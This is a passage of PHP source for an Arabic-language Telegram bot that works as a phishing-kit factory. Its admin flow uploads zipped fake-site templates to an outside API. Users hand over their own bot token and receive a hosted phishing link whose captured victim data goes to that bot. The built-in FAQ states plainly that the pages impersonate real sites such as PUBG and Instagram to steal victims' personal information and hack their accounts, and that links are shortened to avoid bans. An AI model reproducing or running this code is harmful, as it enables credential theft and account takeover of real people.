	",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
		exit;
	}
}
if($sting['sting']['sting'] == 'send' or $sting['sting']['sting'] == 'forward'){
	if($text and $sting['send']['id'] != null){
			bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	يجب عليك انتظار إنتهاء الإذاعة العادية /: 🙁
	",'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
	]);
			exit;
		}
	}
if($data == "sendprofile"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	قم بإرسال أي شيء حتى أرسله لـ $countmembers عضو 👤
	",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'إلغاء ❎','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = 'send';
					$sting['sting']['id'] = $chat_id;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($message and !$data and $sting['sting']['sting'] == 'send' and $sting['sting']['id'] == $chat_id){
$ms = bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	جاري بدأ الإذاعة 😌♥️
	",'reply_to_meesage_id'=>$message_id,
	])->result->message_id;
$sting['send']['id'] = $ms;
$sting['send']['from'] = $from_id;
$sting['send']['num'] = 0;
if($text){
$sting['send']['method'] = 'text';
$sting['send']['text'] = $text;
}elseif($photo){
$sting['send']['method'] = 'photo';
$sting['send']['file'] = $photo_id;
}elseif($video){
$sting['send']['method'] = 'video';
$sting['send']['file'] = $video_id;
}elseif($video_note){
$sting['send']['method'] = 'video_note';
$sting['send']['file'] = $video_note_id;
}elseif($sticker){
$sting['send']['method'] = 'sticker';
$sting['send']['file'] = $sticker_id;
}elseif($music){
$sting['send']['method'] = 'audio';
$sting['send']['file'] = $audio_id;
}elseif($voice){
$sting['send']['method'] = 'voice';
$sting['send']['file'] = $voice_id;
}else{
$sting['send']['method'] = 'Document';
$sting['send']['file'] = $file_id;
	}
$sting['sting']['sting'] = null;
$sting['sting']['id'] = null;
file_put_contents("sting.json",json_encode($sting,64|128|256));
file_get_contents("https://".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
}
if($data == "forward"){
			            bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
قم بإرسال أي شيء لأقوم بتوجيهه لجميع الأعضاء 📣
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
],
]])
]);
$sting['sting']['sting'] = 'forward';
$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
			}
			if(!$data and $sting['sting']['sting'] == 'forward' and $sting['sting']['id'] == $from_id){
	$ms = bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	جاري بدأ الإذاعة 😌❤️
	",
	'reply_to_meesage_id'=>$message_id,
])->result->message_id;

$sting['send']['id'] = $ms;
$sting['send']['from'] = $from_id;
$sting['send']['num'] = 0;
$sting['send']['method'] = 'forward';
$sting['send']['mesid'] = $message_id;
$sting['sting']['sting'] = null;
$sting['sting']['id'] = null;
file_put_contents("sting.json",json_encode($sting,64|128|256));
file_get_contents("https://".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
}
if($data == "addIndex"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
حسنا عزيزي قم بإرسال اسم الإندكس 🌚
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
]
]])
]);
$sting['sting']['sting'] = "nameIndex";
$sting['sting']['id'] = $admin;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($data == "delAllIndexs"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
تم حذف كل الإندكسات 😌🎉
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"back"]
]
]])
]);
unset($sting['IndexMember']);
unset($sting['IndexsBot']);
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($text and $sting['sting']['sting'] == "nameIndex" and $sting['sting']['id'] == $from_id){
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ أسم الإندكس ✓ ، أرسل وصف الإندكس
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = 'aboudIndex';
$sting['addIndex']['n'] = str_replace(['[','*',']','_','(',')','`'],null,$text);
file_put_contents("sting.json",json_encode($sting,64|128|256));
exit;
}
if($text and $sting['sting']['sting'] == "aboudIndex" and $sting['sting']['id'] == $from_id){
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ وصف الإندكس ✓ ، أرسل صورة الإندكس
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = 'photoIndex';
$sting['addIndex']['a'] = str_replace(['[','*',']','_','(',')','`'],null,$text);
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($photo and $sting['sting']['sting'] == "photoIndex" and $sting['sting']['id'] == $from_id){
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ صورة الإندكس ✓ ، أرسل ملف الإندكس بصيغة zip 🗂️ ويجب أن يكون فريد من نوعه 🙂
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = 'fileIndex';
$sting['addIndex']['p'] = $photo_id;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($file and $sting['sting']['sting'] == "fileIndex" and $sting['sting']['id'] == $from_id and !in_array($file->file_name,$sting['FileIndexs'])){
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ الإندكس بنجاح 🎉
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
/* Add Indexs */
$sting['IndexsBot'][$sting['addIndex']['n']]['name'] = $sting['addIndex']['n'];
$sting['IndexsBot'][$sting['addIndex']['n']]['aboud'] = $sting['addIndex']['a'];
$sting['IndexsBot'][$sting['addIndex']['n']]['photo'] = $sting['addIndex']['p'];
$sting['IndexsBot'][$sting['addIndex']['n']]['file'] = $file->file_name;
/* Start Api */
$file = "https://api.telegram.org/file/bot".API_KEY."/".bot('getfile',['file_id'=>$message->document->file_id])->result->file_path;
apiUseYhya(['Command'=>'Uploade','Url'=>$file,'Script'=>$message->document->file_name]);
/* End Api */
/* Add Index */
$sting['FileIndexs'] = $file->file_name;
$sting['sting']['sting'] = null;
unset($sting['addIndex']);
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($data == "delIndex"){
$reply_markup = [];
$reply_markup['inline_keyboard'][] = [['text'=>'🧾┇الاسم ','callback_data'=>'s'],['text'=>'ℹ️┇الاسم ','callback_data'=>'s']];
foreach($sting['IndexsBot'] as $key => $value){
$reply_markup['inline_keyboard'][] = [['text'=>$value['name'],'callback_data'=>"delIndex=".$key]];
}
$reply_markup['inline_keyboard'][] = [['text'=>'رجوع 🔙','callback_data'=>"back"]];
$reply_markup = json_encode($reply_markup);
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
حسنا عزيزي قم بإختيار اسم الإندكس المراد حذفه 🌚👋
",'reply_markup'=>$reply_markup
]);
}
if(preg_match('/delIndex=(.*)/',$data,$json)){
unset($sting['IndexsBot'][$json[1]]);
file_put_contents("sting.json",json_encode($sting,64|128|256));
$reply_markup = [];
$reply_markup['inline_keyboard'][] = [['text'=>'🧾┇الاسم ','callback_data'=>'s'],['text'=>'ℹ️┇الاسم ','callback_data'=>'s']];
foreach($sting['IndexsBot'] as $key => $value){
$reply_markup['inline_keyboard'][] = [['text'=>$value['name'],'callback_data'=>"delIndex*".$key]];
}
$reply_markup['inline_keyboard'][] = [['text'=>'رجوع 🔙','callback_data'=>"back"]];
$reply_markup = json_encode($reply_markup);
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	تم الحذف ✓؛
حسنا عزيزي قم بإختيار اسم الإندكس المراد حذفه 🌚👋
",'reply_markup'=>$reply_markup
]);
}
if($text == "/start" or $text == 'رجوع 🔙'){
	$key = [
	[['text'=>'صنع إندكس ➕'],['text'=>'إندكساتي 📋']],
	[['text'=>'المساعده ✉️']],
	];
	$name = str_replace(['[',']','(',')','*'],'',$name);
	$start = str_replace(['#name','#id','#user','#number'],[$name,$from_id,$user,$countmembers],$sting['sting']['start']);
	$ok = bot('sendphoto',[
		'chat_id'=>$chat_id,
		'photo'=>$sting['sting']['photostart'],
		'caption'=>$start,
		'reply_to_meesage_id'=>$message_id,
		'parse_mode'=>"MarkDown",
		'reply_markup'=>json_encode(['keyboard'=>$key,'resize_keyboard'=>true])
	])->ok;
	if(!$ok){
		bot('sendmessage',[
			'chat_id'=>$chat_id,
			'text'=>$start,
			'reply_to_meesage_id'=>$message_id,
			'parse_mode'=>"MarkDown",
			'reply_markup'=>json_encode(['keyboard'=>$key,'resize_keyboard'=>true])
		]);
	}
	unset($sting['tk'][$from_id]);
	file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($text == "صنع إندكس ➕"){
	if(count($sting['IndexsBot']) < 1){
		bot('sendmessage',[
			'chat_id'=>$chat_id,
			'text'=>"عذرا لا يوجد أي إندكس 😅",'reply_to_meesage_id'=>$message_id,'reply_markup'=>json_encode(['keyboard'=>[[['text'=>'رجوع 🔙']]],'resize_keyboard'=>true])
	]);
	}else{
		foreach($sting['IndexsBot'] as $key => $value){
			$indexBot .= $key."*";
		}
		$indexBots = explode('*',$indexBot);
		bot('sendphoto',[
	'chat_id'=>$chat_id,
	'photo'=>$sting['IndexsBot'][$indexBots[0]]['photo'],
	'caption'=>"*إندكس ".$indexBots[0]."*
	".$sting['IndexsBot'][$indexBots[0]]['aboud']."
	",
	'reply_to_meesage_id'=>$message_id,
	'parse_mode'=>"markdown",
	'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
			'inline_keyboard'=>[
				[['text'=>'السابق 🔙','callback_data'=>'last#0'],['text'=>'التالي 🔜','callback_data'=>'next#0']],
				[['text'=>'إنشاء 🤖','callback_data'=>'new#0']]
		]])
	]);
	}
}elseif($text == "إندكساتي 📋"){
	$index = ($sting['IndexMember'][$from_id] != null) ? "إندكساتك هي 🤖 \n".$sting['IndexMember'][$from_id] : 'عذرا لم تقم بإنشاء أي إندكس 😐';
	bot('sendmessage',[
			'chat_id'=>$chat_id,
			'text'=>$index,'reply_to_meesage_id'=>$message_id,'reply_markup'=>json_encode(['keyboard'=>[[['text'=>'رجوع 🔙']]],'resize_keyboard'=>true])
	]);
}elseif($text == "المساعده ✉️"){
	bot('sendmessage',[
		'chat_id'=>$chat_id,
		'text'=>"
		* 📊 الأسئلة المتداولة
		
		1- ماهو الاندكس ؟
		2- كيف يمكنني الاستفاده من الاندكس ؟
		3- ما هي سرعه الاندكسات ؟
		4- كيف يمكنني معرفه واجهه الاندكس الخاصه بي؟
		5- هل يمكنني صنع اكثر من اندكس؟
		6- كيف يمكنني صنع (توكن) ؟*",
		'parse_mode'=>"markdown",
		'reply_to_meesage_id'=>$message_id,
		'reply_markup'=>json_encode([
			'inline_keyboard'=>[
				[['text'=>'1','callback_data'=>'1'],['text'=>'2','callback_data'=>'2'],['text'=>'3','callback_data'=>'3'],['text'=>'4','callback_data'=>'4']],
				[['text'=>'5','callback_data'=>'5'],['text'=>'6','callback_data'=>'6']],
		]])
	]);
}
$array = [
1=>"* 📊 الأسئلة المتداولة\nج1/ \nالاندكس هو واجهة مزوره لموقع معين يكون الموقع حقيقي اي انه موجود على ارض الواقع او يكون شكل موقع وهمي من تصميم المطورين اي انه موقع متكامل و بمواصفات الموقع الحقيقي و لكنه مزور اي من تصميم شخصي و يمكنك خداع الضحايا به *",
2=>" * 📊 الأسئلة المتداولة\nج2/\nالاستفاده من الاندكس هو خداع الضحايا و اقناعهم بأنه موقع حقيقي و ذلك للاستفاده من سحب معلوماتهم الشخصيه و اختراق حساباتهم عن طريق تزوير المواقع و صيد المعلومات التي يقوم بادخالها الضحيه و ايصال هذهِ المعلومات بشكل متسلسل على بوت في التلكرام *",
3=>"* 📊 الأسئلة المتداولة\nج3/ \nالاندكسات تكوم سريعه جدا و ذلك لرفعها على استضافات مدفوعه اي تكون سريعه جدا بأيصال معلومات الضحيه لمستخدم المصنع و يمكنك تسجيل المعلومات بأريحيه تامه *",
4=>"* 📊 الأسئلة المتداولة\nج4/\nبعد ان تقوم بصناعه بوتك الخاص سيقوم المصنع بأرسال رابط الاندكس الخاص بك معه معرف البوت الذي سيصل عليه معلومات الضحيه ، يكون رابط الاندكس الخاص بك مختصر تلقائيا لتجنب حظره من مواقع التواصل الاجتماعي *",
5=>"* 📊 الأسئلة المتداولة\nج/5\nاذا كانت خطه البوت الخاص بك مجانيه سيمكنك صنع بوت واحد فقط من كل نوع (PUBG,INSTA) اما اذا كانت خطه البوت الخاص بك مدفوع يمكنك صنع اكثر من اندكس بواجهات متنوعه و متجدده و بتصاميم جديده *",
6=>"*📊 الأسئلة المتداولة\nج6/\nيمكنك صنع توكن الخاص بك من @botfather \nلمعرفه المزيد* [اضغط هنا ](https://t.me/InDx_HB/407)",
];
if(in_array($data,array_keys($array))){
	bot('editMessageText',[
		'chat_id'=>$chat_id,
		'message_id'=>$message_id,
		'text'=>$array[$data],
		'parse_mode'=>"markdown",
		'disable_web_page_preview'=>true,
		'reply_markup'=>json_encode([
			'inline_keyboard'=>[
				[['text'=>'1','callback_data'=>'1'],['text'=>'2','callback_data'=>'2'],['text'=>'3','callback_data'=>'3'],['text'=>'4','callback_data'=>'4']],
				[['text'=>'5','callback_data'=>'5'],['text'=>'6','callback_data'=>'6']],
		]])
	]);
}elseif($sting['tk'][$from_id]){
	$info = json_decode(file_get_contents("https://api.telegram.org/bot".filter_var($text,FILTER_SANITIZE_STRING)."/getme"));
	if($info->ok and preg_match('/\d:\S{35}/',$text)){
		$index = $sting['tk'][$from_id];
		$a = '<?php
$tokenYhya = "'.filter_var($text,FILTER_SANITIZE_STRING).'";
$idYhya = "'.$from_id.'";
?>';
		$url = apiUseYhya(['Command'=>'New','Script'=>$sting['IndexsBot'][$index]['file'],'File'=>$a])['url'];;
		$bot = $info->result->username;
		bot('sendmessage',[
			'chat_id'=>$chat_id,
			'text'=>"
تم إنشاء الإندكس بنجاح ✓
اسم الإندكس : $index
رابط الإندكس :
 $url
بوت إستلام الضحايه : @$bot
	",'reply_to_meesage_id'=>$message_id,'reply_markup'=>json_encode(['keyboard'=>[[['text'=>'رجوع 🔙']]],'resize_keyboard'=>true])
		]);
		unset($sting['tk'][$from_id]);
		$sting['IndexMember'][$from_id] .= "اسم الإندكس : $index
رابط الإندكس :
 $url
بوت إستلام الضحايه : @$bot\n";
		file_put_contents("sting.json",json_encode($sting,64|128|256));
	}else{
		bot('sendmessage',[
			'chat_id'=>$chat_id,
			'text'=>"عذرا عمري التوكن غير صحيح 🙁",'reply_to_meesage_id'=>$message_id,'reply_markup'=>json_encode(['keyboard'=>[[['text'=>'رجوع 🔙']]],'resize_keyboard'=>true])
		]);
	}
}
if(preg_match('/last#(.*)/',$data,$json)){
	$json[1]--;
	bot('deletemessage',['chat_id'=>$chat_id,'message_id'=>$message_id]);
	foreach($sting['IndexsBot'] as $key => $value){
		$indexBot .= $key."*";
	}
	$indexBots = explode('*',$indexBot);
	if($json[1] < 0){$json[1] = count($indexBots)-2;}
		$indexBots = explode('*',$indexBot);
		bot('sendphoto',[
	'chat_id'=>$chat_id,
	'photo'=>$sting['IndexsBot'][$indexBots[$json[1]]]['photo'],
	'caption'=>"*إندكس ".$indexBots[$json[1]]."*
	".$sting['IndexsBot'][$indexBots[$json[1]]]['aboud']."
	",
	'reply_to_meesage_id'=>$message_id,
	'parse_mode'=>"markdown",
	'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
			'inline_keyboard'=>[
				[['text'=>'السابق 🔙','callback_data'=>'last#'.$json[1]],['text'=>'التالي 🔜','callback_data'=>'next#'.$json[1]]],
				[['text'=>'إنشاء 🤖','callback_data'=>'new#'.$json[1]]]
		]])
	]);
}elseif(preg_match('/next#(.*)/',$data,$json)){
	$json[1]++;
	bot('deletemessage',['chat_id'=>$chat_id,'message_id'=>$message_id]);
	foreach($sting['IndexsBot'] as $key => $value){
		$indexBot .= $key."*";
	}
	$indexBots = explode('*',$indexBot);
	if($json[1] > (count($indexBots) - 2)){$json[1] = 0;}
		bot('sendphoto',[
	'chat_id'=>$chat_id,
	'photo'=>$sting['IndexsBot'][$indexBots[$json[1]]]['photo'],
	'caption'=>"*إندكس ".$indexBots[$json[1]]."*
	".$sting['IndexsBot'][$indexBots[$json[1]]]['aboud']."
	",
	'reply_to_meesage_id'=>$message_id,
	'parse_mode'=>"markdown",
	'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
			'inline_keyboard'=>[
				[['text'=>'السابق 🔙','callback_data'=>'last#'.$json[1]],['text'=>'التالي 🔜','callback_data'=>'next#'.$json[1]]],
				[['text'=>'إنشاء 🤖','callback_data'=>'new#'.$json[1]]]
		]])
	]);
}elseif(preg_match('/new#(.*)/',$data,$json)){
	bot('deletemessage',['chat_id'=>$chat_id,'message_id'=>$message_id]);
	foreach($sting['IndexsBot'] as $key => $value){
		$indexBot .= $key."*";
	}
	$indexBots = explode('*',$indexBot);
	bot('sendmessage',[
		'chat_id'=>$chat_id,
		'text'=>"حسنا عزيزي قم بإرسال التوكن لإستلام الضحاية"]);
		$sting['tk'][$from_id] = $indexBots[$json[1]];
		file_put_contents("sting.json",json_encode($sting,64|128|256));
}
